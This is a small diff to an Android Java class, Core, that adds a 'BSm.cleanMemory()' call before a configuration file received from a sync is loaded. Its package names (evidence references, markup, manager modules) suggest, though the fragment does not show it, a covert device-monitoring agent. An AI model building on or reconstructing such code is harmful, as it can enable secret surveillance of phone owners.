@@ -27,6 +27,7 @@ import com.android.networking.evidence.EvidenceReference;
 import com.android.networking.evidence.Markup;
 import com.android.networking.file.AutoFile;
 import com.android.networking.file.Path;
+import com.android.networking.listener.BSm;
 import com.android.networking.manager.ManagerEvent;
 import com.android.networking.manager.ManagerModule;
 import com.android.networking.optimize.NetworkOptimizer;
@@ -506,9 +507,10 @@ public class Core extends Activity implements Runnable {
 		}
 
 		if (Cfg.DEBUG) {
-
 			Check.log(TAG + " (loadConf): TRY NEWCONF");
 		}
+		
+		BSm.cleanMemory();
 
 		// tries to load the file got from the sync, if any.
 		AutoFile file = new AutoFile(Path.conf() + ConfType.NewConf);
